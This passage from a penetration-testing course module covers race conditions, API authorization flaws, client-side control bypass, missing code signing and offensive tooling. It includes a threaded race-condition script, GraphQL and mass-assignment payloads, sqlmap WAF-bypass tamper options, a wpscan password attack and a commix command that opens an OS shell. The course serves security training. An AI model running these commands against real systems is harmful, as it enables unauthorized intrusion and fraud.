+STRIPE_WEBHOOK_SECRET=STRIPE_SECRET_KEY=FAKE_STRIPE
+
+MAIL_USERNAME=no-reply@targetcompany.com
+MAIL_PASSWORD=EmailP@ssw0rd2024
+
+REDIS_PASSWORD=Redis_Secret_2024
+```
+
+A single exposed `.env` file like this can compromise the entire application infrastructure — database, cloud provider account, payment processor, email system, and caching layer.
+
+---
+
+### 6.12.5 Race Conditions
+
+#### The Timing Attack on Business Logic
+
+A race condition is a software flaw where the behavior of a program depends on the relative timing of concurrent operations, and that timing can be manipulated by an attacker to cause unintended behavior.
+
+In the context of web applications, race conditions occur in sequences where:
+1. The application reads a state value (checking if a coupon is valid, verifying account balance, checking inventory)
+2. The application makes a decision based on that state
+3. The application updates the state (marking coupon as used, deducting balance, reducing inventory)
+
+If multiple requests arrive simultaneously, multiple instances of step 1 may execute before any instance of step 3 completes. Each request reads the original state and makes the same decision independently — but only one state update may occur, or the updates may conflict.
+
+This was covered conceptually in Section 6.3 (Business Logic Flaws). Here we focus on the technical exploitation:
+
+#### Race Condition Attack Techniques
+
+**The Last-Byte Synchronization Technique:**
+
+HTTP/1.1 requests are sent sequentially. For a race condition attack, requests need to arrive at the server simultaneously — within microseconds of each other.
+
+The most effective technique is to build all requests completely and then send only the final byte of each simultaneously. TCP buffers the data on the server side, and releasing the final bytes simultaneously causes the server to process all requests at nearly the same moment.
+
+**In Burp Suite:**
+
+```
+1. Capture the sensitive request (e.g., coupon redemption)
+2. Right-click → "Send to Repeater"
+3. Repeat this 20 times (20 tabs, same request)
+4. In Repeater: select all tabs (Ctrl+A)
+5. Right-click → "Send group in parallel (last-byte sync)"
+6. All 20 requests fire simultaneously
+7. Observe responses — how many succeeded?
+```
+
+**Python implementation for precise timing:**
+
+```python
+import threading
+import requests
+import time
+
+target_url = "https://target.com/api/redeem-coupon"
+headers = {
+    "Cookie": "session=your_session_cookie",
+    "Content-Type": "application/json"
+}
+data = {"coupon_code": "SAVE50"}
+
+# Store all responses
+responses = []
+lock = threading.Lock()
+
+def send_request():
+    response = requests.post(target_url, headers=headers, json=data)
+    with lock:
+        responses.append({
+            "status": response.status_code,
+            "body": response.json() if response.headers.get('content-type', '').startswith('application/json') else response.text
+        })
+
+# Create 20 threads
+threads = []
+for i in range(20):
+    t = threading.Thread(target=send_request)
+    threads.append(t)
+
+# Start all threads simultaneously
+for t in threads:
+    t.start()
+
+# Wait for completion
+for t in threads:
+    t.join()
+
+# Analyze results
+successes = [r for r in responses if r["status"] == 200]
+print(f"Total requests: {len(responses)}")
+print(f"Successful responses: {len(successes)}")
+if len(successes) > 1:
+    print(f"RACE CONDITION CONFIRMED: {len(successes)} successful redemptions")
+```
+
+**High-precision Turbo Intruder (Burp extension):**
+
+For more precise timing control, Turbo Intruder sends requests with sub-millisecond precision:
+
+```python
+# Turbo Intruder script for race condition testing:
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                          concurrentConnections=20,
+                          requestsPerConnection=1,
+                          pipeline=False)
+    
+    # Queue 20 identical requests
+    for i in range(20):
+        engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+#### Common Race Condition Targets
+
+| Functionality | Race Condition Impact |
+|---------------|----------------------|
+| Single-use discount codes | Redeem same code multiple times |
+| "Limit 1 per customer" promotions | Bypass purchase limit |
+| Account balance deduction | Spend the same balance twice |
+| File upload with virus scan | Upload malicious file between scan and move |
+| Email verification token | Use verification token multiple times |
+| Password reset token | Execute multiple resets simultaneously |
+| Gift card redemption | Apply gift card balance multiple times |
+| Inventory reservation | Reserve more items than available |
+| Rate limiting by session count | Create multiple sessions simultaneously |
+
+---
+
+### 6.12.6 Unprotected APIs
+
+#### The API Security Gap
+
+Modern web applications are built around APIs — Application Programming Interfaces that separate the front-end presentation from the back-end business logic. Single-page applications (React, Vue, Angular), mobile applications, and IoT devices all consume the same backend APIs.
+
+The security gap arises because:
+- The web UI enforces access controls through visible/invisible elements and client-side routing
+- The API endpoints are often implemented with minimal or no server-side authorization checking
+- Developers assume only the official clients will call the API
+- API documentation (Swagger/OpenAPI) may be publicly accessible, mapping the entire attack surface
+- API versioning creates old, forgotten endpoints with weaker security
+
+The most dangerous assumption in API security: **"This endpoint isn't linked anywhere in the UI, so nobody will find it."** This is incorrect, as JavaScript analysis, directory brute force, API documentation exposure, and traffic analysis all reveal API endpoints.
+
+#### API Discovery Techniques
+
+**From JavaScript bundle analysis:**
+
+SPAs bundle all API calls into JavaScript. Extract them:
+```bash
+# Download main JavaScript bundle:
+curl -s https://target.com/static/js/main.abc123.js | \
+  grep -oE "(/api/|/v[0-9]+/)[a-zA-Z0-9/_-]+" | sort -u
+
+# LinkFinder for comprehensive extraction:
+python3 linkfinder.py -i https://target.com -d -o cli | grep "/api/"
+```
+
+**From API documentation exposure:**
+
+```bash
+# Common API documentation paths:
+curl https://target.com/swagger.json
+curl https://target.com/swagger/v1/swagger.json
+curl https://target.com/api/swagger.json
+curl https://target.com/openapi.json
+curl https://target.com/api-docs
+curl https://target.com/api/docs
+curl https://target.com/v1/docs
+curl https://target.com/redoc
+
+# Nuclei check for exposed API documentation:
+nuclei -u https://target.com -tags swagger,openapi,api-docs
+```
+
+**From Burp Spider and manual browsing:**
+
+Let Burp's spider and manual browsing build a complete map of API endpoints in the site map. Then navigate the application through every UI flow — login, view profile, edit profile, purchase, checkout — while Burp captures all API calls.
+
+#### Common API Vulnerabilities
+
+**BOLA — Broken Object Level Authorization (API-specific IDOR):**
+
+The API equivalent of IDOR. API endpoints accept object IDs and return data for those objects without verifying the requesting user owns them:
+
+```bash
+# Endpoint returns your own order:
+GET /api/v1/orders/8812
+Authorization: Bearer USER_A_TOKEN
+
+# Enumerate other orders — does authorization check who owns order 8813?
+GET /api/v1/orders/8813
+Authorization: Bearer USER_A_TOKEN
+
+# API documentation reveals all order IDs are UUIDs, but are they random?
+# If not: enumerate sequentially or predictably
+```
+
+**BFLA — Broken Function Level Authorization (API-specific privilege escalation):**
+
+API endpoints for admin functions accessible to regular users:
+
+```bash
+# Normal users are directed to:
+GET /api/v1/users/me
+
+# But the admin endpoint exists and may work:
+GET /api/v1/admin/users
+GET /api/v1/admin/users/1042
+DELETE /api/v1/admin/users/1042
+POST /api/v1/admin/promote?user_id=1042&role=admin
+```
+
+**Mass Assignment via API:**
+
+APIs that automatically bind request parameters to model properties allow privilege escalation by submitting non-intended fields:
+
+```bash
+# Normal user update endpoint:
+PATCH /api/v1/users/me
+Content-Type: application/json
+Authorization: Bearer USER_TOKEN
+
+{"name": "Alice", "email": "alice@example.com"}
+
+# Malicious request — add role field:
+PATCH /api/v1/users/me
+Content-Type: application/json
+Authorization: Bearer USER_TOKEN
+
+{"name": "Alice", "email": "alice@example.com", "role": "admin", "isAdmin": true}
+
+# If API uses mass assignment (maps all request fields to model):
+# User becomes admin
+```
+
+**Unauthenticated API Endpoints:**
+
+```bash
+# Test every API endpoint without any Authorization header:
+curl -X GET https://target.com/api/v1/users
+curl -X GET https://target.com/api/v1/orders
+curl -X POST https://target.com/api/v1/admin/create-user \
+  -H "Content-Type: application/json" \
+  -d '{"username":"hacker","password":"hacker123","role":"admin"}'
+
+# Internal API endpoints that bypass authentication:
+# /api/internal/ — often accessible from within the data center only
+# But if SSRF exists elsewhere: SSRF → internal API call → admin access
+```
+
+**GraphQL-Specific Attacks:**
+
+```bash
+# Introspection — reveals complete schema:
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
+
+# If introspection is enabled, use graphql-voyager to visualize the schema
+# or InQL Burp extension to generate attack requests for every endpoint
+
+# Batch queries for rate limit bypass:
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"query": "query { user(id: 1) { email password } }"},
+    {"query": "query { user(id: 2) { email password } }"},
+    {"query": "query { user(id: 3) { email password } }"}
+  ]'
+
+# Field duplication (can bypass field limits):
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ user { id id id id id id id id id id id } }"}'
+
+# GraphQL injection:
+curl -X POST https://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ user(id: \"1\\\") { id } }\")"}'
+```
+
+---
+
+### 6.12.7 Hidden Elements and Client-Side Controls
+
+#### Why "Hidden" Means Nothing for Security
+
+A common developer misconception: if a UI element is hidden from the user, the user cannot interact with it. This is completely false. CSS `display:none`, HTML `hidden` attribute, or JavaScript-controlled visibility are purely visual — the underlying HTML elements still exist in the DOM, and the form fields, buttons, and parameters they represent are still submitted in HTTP requests.
+
+An attacker using Burp Suite does not see the rendered, filtered view — they see raw HTTP. Every hidden field in a form is included in the POST request. Every client-side validation check can be removed by intercepting and modifying the request. Every disabled button can be clicked by manipulating the DOM. Every access control enforced only in JavaScript is bypassed the moment the attacker bypasses the JavaScript.
+
+**Common hidden element patterns:**
+
+```html
+<!-- Role stored in hidden field — modify before submission: -->
+<input type="hidden" name="role" value="user">
+
+<!-- User ID of the resource being modified: -->
+<input type="hidden" name="user_id" value="1042">
+
+<!-- Price calculated client-side: -->
+<input type="hidden" name="price" value="99.99">
+
+<!-- Checkbox that controls premium feature: -->
+<input type="checkbox" name="premium" style="display:none" checked>
+
+<!-- A disabled button for an action the user "shouldn't" be able to perform: -->
+<button id="admin-delete" disabled style="display:none" onclick="deleteUser()">Delete User</button>
+<!-- If server accepts the underlying endpoint, enabling this in DevTools works: -->
+```
+
+**How to test:**
+
+```javascript
+// In browser DevTools Console — remove "disabled" from all buttons:
+document.querySelectorAll('button[disabled]').forEach(b => b.disabled = false);
+
+// Show all hidden elements:
+document.querySelectorAll('[style*="display:none"]').forEach(e => e.style.display = 'block');
+document.querySelectorAll('[hidden]').forEach(e => e.removeAttribute('hidden'));
+
+// Modify a hidden form field value:
+document.querySelector('input[name="role"]').value = 'admin';
+
+// Submit the form with modified values
+```
+
+**In Burp Suite:**
+1. Submit a form legitimately
+2. In Burp Proxy — intercept the request before forwarding
+3. Modify any parameter value (including hidden fields, prices, IDs, roles)
+4. Forward the modified request
+5. Observe whether the server trusts the modified value
+
+The server must validate all values server-side, regardless of whether they were intended to be user-editable. Any server-side processing that trusts a client-submitted value that could have been tampered with is a vulnerability.
+
+**Client-side validation bypass:**
+
+```html
+<!-- HTML5 validation (purely client-side — bypass by intercepting the request): -->
+<input type="email" required pattern="[a-z]+@[a-z]+\.[a-z]+">
+<input type="number" min="1" max="100">
+<input type="text" maxlength="50">
+
+<!-- JavaScript validation: -->
+<form onsubmit="return validateForm()">
+
+<!-- All of these are bypassed by:
+     1. Editing the form directly in DevTools (remove the attributes)
+     2. Intercepting the form submission in Burp and modifying the values
+     3. Using curl to send any value directly, bypassing the form entirely
+-->
+```
+
+---
+
+### 6.12.8 Lack of Code Signing
+
+#### What Code Signing Protects and What Happens Without It
+
+Code signing is the practice of cryptographically signing software artifacts — binaries, JavaScript bundles, configuration files, firmware images — with the developer's private key. Users can verify the signature with the corresponding public key to confirm the file came from the legitimate developer and has not been tampered with.
+
+Without code signing:
+- Users cannot verify software came from the legitimate source
+- Intermediate CDNs, package registries, or update servers could serve modified malicious versions
+- Supply chain attacks become possible without cryptographic detection
+
+**Subresource Integrity (SRI) — Code Signing for Web Resources:**
+
+When a web page loads a JavaScript library from a CDN, the browser has no way to verify the CDN serves the correct, unmodified file. If the CDN is compromised or the file is replaced, malicious code runs on every visitor's browser.
+
+SRI (Subresource Integrity) solves this. The HTML tag includes a cryptographic hash of the expected file content. The browser downloads the file, computes the hash, and refuses to execute it if the hash does not match:
+
+```html
+<!-- WITHOUT SRI - trusts CDN completely: -->
+<script src="https://cdn.example.com/jquery-3.7.0.min.js"></script>
+
+<!-- WITH SRI - cryptographically verified: -->
+<script 
+  src="https://cdn.example.com/jquery-3.7.0.min.js"
+  integrity="sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb3"
+  crossorigin="anonymous">
+</script>
+```
+
+If the CDN serves a modified `jquery-3.7.0.min.js` (with a cryptocurrency miner, a keylogger, or a malicious redirect injected), the hash will not match and the browser will refuse to load it.
+
+**Testing for missing SRI:**
+
+```bash
+# Check for external scripts without integrity attributes:
+curl -s https://target.com/ | grep -i '<script src' | grep -v 'integrity='
+
+# Nuclei check:
+nuclei -u https://target.com -id missing-sri
+
+# Manual check: in DevTools → Sources, look for external scripts
+# → Security → check if any external origins are loaded without verification
+```
+
+**Software update mechanisms:**
+
+Desktop applications that download updates over HTTP (without HTTPS and without signature verification) are vulnerable to in-path replacement attacks. An attacker positioned on the network can intercept the update download and replace it with a malicious installer. The application installs the malicious version without knowing the package was tampered with.
+
+**npm/pip package security:**
+
+JavaScript's npm ecosystem and Python's pip have both suffered supply chain attacks where attackers published malicious packages with names similar to popular legitimate packages (typosquatting). Without lockfiles and hash verification, an application might accidentally install a malicious package.
+
+---
+
+### 6.12.9 Additional Web Application Hacking Tools
+
+#### The Professional Web Application Testing Toolkit
+
+Beyond the tools covered throughout Module 6, a comprehensive professional toolkit includes several additional resources worth knowing:
+
+**ffuf — Fast Web Fuzzer**
+
+The fastest parameter and content discovery tool available. Outperforms gobuster and dirbuster in both speed and flexibility:
+
+```bash
+# Directory discovery:
+ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+# Parameter discovery — find hidden GET parameters:
+ffuf -u https://target.com/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+# POST parameter discovery:
+ffuf -u https://target.com/login -X POST -d "FUZZ=test" \
+  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -H "Content-Type: application/x-www-form-urlencoded"
+
+# Virtual host discovery:
+ffuf -u https://target.com/ -H "Host: FUZZ.target.com" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Filter by size/status:
+ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 4242 -fc 404,403
+```
+
+**Arjun — HTTP Parameter Discovery**
+
+Discovers hidden parameters in web applications:
+
+```bash
+pip3 install arjun
+
+# Discover GET parameters:
+arjun -u https://target.com/page
+
+# Discover POST parameters:
+arjun -u https://target.com/api -m POST -H "Content-Type: application/json"
+
+# Against all pages in a site:
+arjun -u https://target.com/page1 https://target.com/page2 https://target.com/api
+```
+
+**Dalfox — XSS Scanner**
+
+A modern, fast XSS discovery and verification tool:
+
+```bash
+# Install:
+go install github.com/hahwul/dalfox/v2@latest
+
+# Basic scan:
+dalfox url https://target.com/search?q=test
+
+# With cookie for authenticated testing:
+dalfox url "https://target.com/search?q=test" --cookie "session=abc123"
+
+# From Burp's saved request:
+dalfox file burp_request.txt
+
+# Pipe URLs:
+cat urls.txt | dalfox pipe
+```
+
+**Kiterunner — API Endpoint Discovery**
+
+Specifically designed for API route discovery using OpenAPI specifications:
+
+```bash
+# Install:
+go install github.com/assetnote/kiterunner@latest
+
+# Brute force API routes:
+kr scan https://target.com/api -w routes-small.kite
+
+# Using Assetnote's pre-built wordlists:
+kr scan https://target.com/api -w apis.txt
+
+# Against a list of targets:
+kr scan -w wordlist.txt -i targets.txt
+```
+
+**SQLmap — Advanced Usage for Professional Assessments:**
+
+```bash
+# Beyond basic usage — for complex scenarios:
+
+# Test with custom headers (API key authentication):
+sqlmap -u "https://target.com/api/users?id=1" \
+  --headers="X-API-Key: your-api-key\nX-User-Id: 1042"
+
+# JSON parameter testing:
+sqlmap -u "https://target.com/api/search" \
+  --data='{"query":"test","limit":10}' \
+  --content-type="application/json"
+
+# Second-order injection (data stored then used elsewhere):
+sqlmap -u "https://target.com/profile" \
+  --data="bio=test" \
+  --second-url="https://target.com/admin/users"
+
+# Using tamper scripts for WAF bypass:
+sqlmap -u "https://target.com/?id=1" \
+  --tamper=space2comment,between,randomcase \
+  --dbs
+
+# All tamper scripts:
+ls /usr/share/sqlmap/tamper/
+```
+
+**WPScan — WordPress Security Scanner:**
+
+```bash
+# WordPress vulnerability scanning:
+wpscan --url https://target.com
+
+# With API token for vulnerability database:
+wpscan --url https://target.com --api-token YOUR_TOKEN
+
+# Enumerate users:
+wpscan --url https://target.com -e u
+
+# Enumerate plugins:
+wpscan --url https://target.com -e p --plugins-detection aggressive
+
+# Password attack on discovered users:
+wpscan --url https://target.com -U admin -P /usr/share/wordlists/rockyou.txt
+
+# Full enumeration:
+wpscan --url https://target.com -e ap,at,cb,dbe,u --api-token TOKEN
+```
+
+**XSStrike — Intelligent XSS Testing:**
+
+```bash
+git clone https://github.com/s0md3v/XSStrike
+cd XSStrike && pip3 install -r requirements.txt
+
+# Crawl and test entire site:
+python3 xsstrike.py -u https://target.com --crawl
+
+# Test specific parameter:
+python3 xsstrike.py -u "https://target.com/search?q=test"
+
+# POST request testing:
+python3 xsstrike.py -u https://target.com/login \
+  --data "username=test&password=test"
+
+# Blind XSS mode:
+python3 xsstrike.py -u "https://target.com/feedback" \
+  --data "message=test" --blind
+```
+
+**Commix — Command Injection Testing:**
+
+```bash
+git clone https://github.com/commixproject/commix
+cd commix && python3 commix.py
+
+# Test URL parameter:
+python3 commix.py --url="https://target.com/ping?host=127.0.0.1"
+
+# Test POST parameter:
+python3 commix.py --url="https://target.com/ping" \
+  --data="host=127.0.0.1"
+
+# Get reverse shell:
+python3 commix.py --url="https://target.com/ping?host=127.0.0.1" \
+  --os-shell
+```
+
+---
+
+### 6.12.10 The OWASP Web Security Testing Guide
+
+#### What the WSTG Is and Why It Is the Professional Standard
+
+The OWASP Web Security Testing Guide (WSTG) is the most comprehensive, peer-reviewed, and widely referenced standard methodology for web application security testing. It provides detailed testing procedures for every category of web vulnerability, organized into a structured framework that ensures comprehensive coverage of the attack surface.
+
+Available at: [https://owasp.org/www-project-web-security-testing-guide/](https://owasp.org/www-project-web-security-testing-guide/)
+Latest version: WSTG v4.2 (as of 2026)
+
+The WSTG organizes testing into twelve categories:
+
+| Category Code | Category Name | Coverage |
+|---------------|--------------|---------|
+| WSTG-INFO | Information Gathering | Recon, fingerprinting, application mapping |
+| WSTG-CONF | Configuration Testing | Server config, network/infrastructure, HTTP methods |
+| WSTG-IDNT | Identity Management | Account enumeration, account policies |
+| WSTG-ATHN | Authentication Testing | Password policies, default credentials, lockout |
+| WSTG-AUTHZ | Authorization Testing | Path traversal, privilege escalation, IDOR |
+| WSTG-SESS | Session Management Testing | Cookie attributes, session fixation, CSRF |
+| WSTG-INPV | Input Validation Testing | SQL injection, XSS, command injection, LFI/RFI |
+| WSTG-ERRH | Error Handling | Error codes, stack traces |
+| WSTG-CRYP | Cryptography Testing | TLS, algorithm strength, key management |
+| WSTG-BUSL | Business Logic Testing | Workflow bypass, race conditions |
+| WSTG-CLNT | Client-Side Testing | DOM XSS, clickjacking, CORS |
+| WSTG-APIT | API Testing | REST, GraphQL, SOAP |
+
+**Using the WSTG in practice:**
+
+For each test case, the WSTG provides:
+- Objective: what the test aims to detect
+- How to test: step-by-step methodology
+- Tools: specific tools and commands
+- References: relevant CWEs, CVEs, and academic sources
+- Remediation: how to fix the vulnerability
+
+Professional penetration testers use the WSTG as a checklist to ensure no coverage area is missed. At the start of a web application engagement, work through each WSTG category systematically. The WSTG test IDs (e.g., WSTG-INPV-01 for SQL Injection) provide a standard reference that can be cited in reports.
+
+**The OWASP Testing Framework:**
+
+The WSTG includes a full engagement framework for web application testing:
+- Phase 1: Passive reconnaissance (before any interaction with the target)
+- Phase 2: Active reconnaissance (spidering, scanning, active fingerprinting)
+- Phase 3: Vulnerability testing (systematic testing through all WSTG categories)
+- Phase 4: Exploitation (confirming and demonstrating findings)
+- Phase 5: Post-exploitation (understanding impact)
+- Phase 6: Reporting
+
+---
+
+## 6.13 Module 6 Summary — The Complete Web Application Security Picture
+
+### What Module 6 Built
+
+Module 6 has constructed a comprehensive, professional understanding of web application security — from the foundational HTTP protocol through the most sophisticated attack chains. This summary consolidates the key insight from each section and shows how they connect into a unified security picture.
+
+#### The Foundation — Protocol Understanding (Section 6.1)
+
+You cannot attack what you do not understand. Section 6.1 established that HTTP is the universal substrate of web attacks — every web vulnerability is ultimately an HTTP vulnerability. Understanding the request-response cycle at the byte level, knowing what every header reveals and conceals, understanding how the browser's handling of cookies creates both functionality and vulnerability, and knowing the precise boundary of what HTTPS protects (the channel) versus what it does not protect (the application) — these form the intellectual foundation upon which every subsequent attack rests.
+
+The OWASP Top 10:2021 provided the attack taxonomy: Broken Access Control (A01), Cryptographic Failures (A02), Injection (A03), Insecure Design (A04), Security Misconfiguration (A05), Vulnerable and Outdated Components (A06), Authentication Failures (A07), Software and Data Integrity Failures (A08), Logging and Monitoring Failures (A09), and SSRF (A10).
+
+#### The Lab Environment (Section 6.2)
+
+Professional penetration testing skills are built through practice, not reading alone. A local lab — Kali Linux with DVWA, Metasploitable, and Docker-based vulnerable applications — provides the safe, legal environment where every technique in this module can be practiced repeatedly until it becomes instinct rather than procedure.
+
+#### Business Logic — The Category Automation Cannot Find (Section 6.3)
+
+Business logic flaws revealed the most fundamental principle in web application security: **automated tools cannot replace human understanding**. A scanner sees requests and responses. Only a human who understands what the application is supposed to do can recognize when it is doing something it should not — when a discount persists after a cart is modified, when a workflow step can be skipped, when simultaneous requests exploit a race condition, when a quantity of -1 makes logical nonsense that the application processes anyway.
+
+The professional approach is the adversarial user perspective: how can legitimate features be used in illegitimate ways?
+
+#### Injection — The Root Cause (Section 6.4)
+
+Injection vulnerabilities — SQL injection, command injection, LDAP injection — share one root cause: failure to separate code from data. Every injection attack is the same conceptual breach: user data enters a context where it is interpreted as executable code. The fix is always the same: parameterized queries and prepared statements for SQL; subprocess lists (not shell=True) for OS commands; proper LDAP escaping for directory queries.
+
+SQL injection's impact scales from data exposure through privilege escalation through file system access through full OS compromise. The attack types — error-based, UNION-based, boolean blind, time-based blind, out-of-band — represent a spectrum from most visible to least visible, matched by escalating detection difficulty.
+
+#### Authentication — The Identity Layer (Section 6.5)
+
+Authentication attacks revealed that the session token is the identity. Stealing a session token steals the authenticated identity — bypassing every authentication control that was used to create it. In 2024, the dominant attack pattern is AitM (Adversary-in-the-Middle) phishing that captures session tokens after MFA completion, because the session proves authentication more persistently than any credential.
+
+Kerberos vulnerabilities in Active Directory environments expose the fundamental architecture of Windows domain authentication to exploitation: AS-REP Roasting requires only usernames; Kerberoasting requires only domain user credentials; Golden Tickets require only the krbtgt hash — and each represents a different depth of compromise.
+
+#### Authorization — The Permissions Layer (Section 6.6)
+
+Authorization failures are the most prevalent web vulnerability category (94% of tested applications). The core failure is always the same: the server validates that a user is authenticated (correct role, valid session) but does not validate that this specific user is authorized to access this specific resource.
+
+IDOR — Insecure Direct Object Reference — is the most impactful manifestation: changing an ID in a URL from your own to another user's reveals their data without any authentication bypass required. Horizontal privilege escalation accesses other users' data. Vertical privilege escalation accesses higher-privilege functionality. HTTP method manipulation, header injection, and CSP bypass all represent different attack surfaces for the same authorization failure.
+
+#### XSS — JavaScript in the Wrong Hands (Section 6.7)
+
+Cross-Site Scripting is not about alert boxes. It is about JavaScript execution in a victim's browser — with access to their session, their data, their credentials, and the ability to make authenticated requests on their behalf. Reflected XSS requires delivery. Stored XSS is persistent and scales. DOM XSS lives entirely in the browser, invisible to server-side detection.
+
+XSS evasion techniques — encoding, alternative tags, template literals, CSP bypass through unsafe-inline and whitelisted JSONP — demonstrated that every blacklist-based defense is bypassable. The only reliable XSS defense is context-aware output encoding and a strict CSP with nonces.
+
+#### CSRF and SSRF — Forged Requests (Section 6.8)
+
+CSRF exploits the browser's automatic cookie attachment to forge authenticated requests from a third-party site. The victim's own browser becomes the attack vector. CSRF tokens and SameSite cookies are the primary defenses.
+
+SSRF makes the server itself the attack vector — instructing it to make requests to internal resources the attacker cannot reach directly. Cloud metadata services (AWS IMDSv1, Azure IMDS, GCP metadata) are the most impactful SSRF targets: a single successful query returns cloud credentials with broad access. The Capital One breach demonstrated that SSRF in a security product can expose over 100 million records.
+
+#### Clickjacking — Visual Deception (Section 6.9)
+
+Clickjacking separates what the user sees from what their clicks accomplish. The X-Frame-Options and CSP `frame-ancestors` headers are the defenses. Their absence allows any state-changing action triggerable by a single click to be performed through invisible iframe overlay.
+
+#### Security Misconfigurations (Section 6.10)
+
+Directory traversal demonstrated that path-based file access without proper restriction allows reading any readable file on the server — escalating through log poisoning to Remote Code Execution. Cookie manipulation showed that the cookie layer's security depends entirely on the security flags applied (`HttpOnly`, `Secure`, `SameSite`) and on the server not trusting user-submitted values that determine identity or privilege.
+
+#### File Inclusion — The Execution Chain (Section 6.11)
+
+File inclusion vulnerabilities transform what seems like a file read into a code execution opportunity. Local File Inclusion chains through log poisoning, /proc/self/environ, PHP wrappers, and session file inclusion to achieve RCE. Remote File Inclusion is more direct — when `allow_url_include` is enabled, hosting a PHP file on your own server and including it via RFI achieves immediate code execution.
+
+The php://filter wrapper deserves special mention: it enables reading the source code of any PHP file without executing it — turning an LFI vulnerability into a complete source code disclosure that reveals database credentials, business logic, and hidden vulnerabilities.
+
+#### Insecure Code Practices — The Human Factor (Section 6.12)
+
+The final section revealed that many of the most impactful vulnerabilities in web applications stem from engineering habits rather than architectural decisions: comments containing credentials, error messages revealing infrastructure details, API keys hard-coded in JavaScript, race conditions in concurrent access to shared resources, APIs that assume only official clients will call them, hidden form fields the server trusts, and missing cryptographic verification of software integrity.
+
+These findings require minimal technical exploitation skill — they require observation, pattern recognition, and the habit of looking at everything the application reveals about itself. The attacker who reads source code, triggers intentional errors, examines JavaScript bundle contents, and checks HTTP response headers thoroughly will consistently find critical vulnerabilities that more technically sophisticated testers miss.
+
+### The Unified View — What Every Web Application Assessment Should Cover
+
+A complete web application security assessment, after Module 6, follows this structure:
+
+**Passive Analysis:** Examine HTTP responses for security headers, technology disclosure, error handling quality, comment content, cookie flags. Analyze JavaScript bundles for endpoints, API keys, and architectural information.
+
+**Active Discovery:** Enumerate endpoints via directory brute force, API documentation, and JavaScript analysis. Map every input parameter. Build a complete application flow model.
+
+**Authentication Testing:** Test login brute force and lockout. Test password reset flows. Analyze session token entropy and security flags. Test session invalidation. Test MFA bypass paths. Check for default credentials.
+
+**Authorization Testing:** Build a privilege matrix. Test IDOR by enumerating object identifiers. Test vertical privilege escalation by accessing admin endpoints as regular users. Test every HTTP method on every endpoint.
+
+**Injection Testing:** Test every input parameter for SQL injection (error-based, then blind). Test command injection on functionality suggesting system calls. Test LFI/RFI on file-handling functionality. Check for LDAP injection on directory-backed applications.
+
+**Client-Side Testing:** Test all reflection points for XSS in correct context. Test multi-step workflows for CSRF vulnerabilities. Test pages for Clickjacking. Analyze JavaScript for DOM XSS sinks.
+
+**Business Logic Testing:** Map critical workflows. Test step skipping and repetition. Test simultaneous requests on rate-limited or single-use functionality. Test all numeric inputs with boundary values.
+
+**Infrastructure Testing:** Test for directory traversal. Check for exposed API documentation. Test SSRF on URL-accepting functionality. Validate TLS configuration. Check for exposed admin panels and debug endpoints.
+
+**This is the complete professional web application security assessment.** Every finding in every category has a direct business impact — from credential theft enabling account takeover, to database compromise enabling mass data exfiltration, to RCE enabling complete infrastructure compromise. Module 6 provided not just the technical knowledge to execute these tests but the conceptual framework to understand why vulnerabilities exist, why defenses succeed or fail, and how to communicate findings in terms of business risk rather than technical details.
+
+---
+
+*═══════════════════════════════════════════════════════════*
+*MODULE 6 — EXPLOITING APPLICATION-BASED VULNERABILITIES*
+*COMPLETE*
+*═══════════════════════════════════════════════════════════*
